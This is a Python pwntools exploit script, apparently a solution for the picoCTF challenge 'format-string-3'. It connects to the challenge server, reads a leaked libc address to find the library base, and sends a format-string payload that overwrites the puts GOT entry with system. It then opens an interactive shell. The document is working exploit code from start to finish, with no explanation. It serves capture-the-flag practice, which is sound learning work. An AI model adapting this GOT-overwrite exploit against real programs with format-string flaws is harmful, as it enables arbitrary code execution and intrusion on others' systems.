#!/usr/bin/env python3

from pwn import *

exe = ELF("./format-string-3")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("rhea.picoctf.net", 51399)

    return r


def main():
    r = conn()

    r.recvuntil(b"libc: ", drop = True)
    libc.address = int(r.recvline().strip(b"\n"), 16) - libc.sym.setvbuf
    log.info(f"libc @ 0x{libc.address:x}")

    payload = fmtstr_payload(offset = 38, writes = {exe.got.puts: libc.sym.system}, strategy = "fast")
    r.sendline(payload)

    r.clean()
    r.interactive("$ ")


if __name__ == "__main__":
    main()
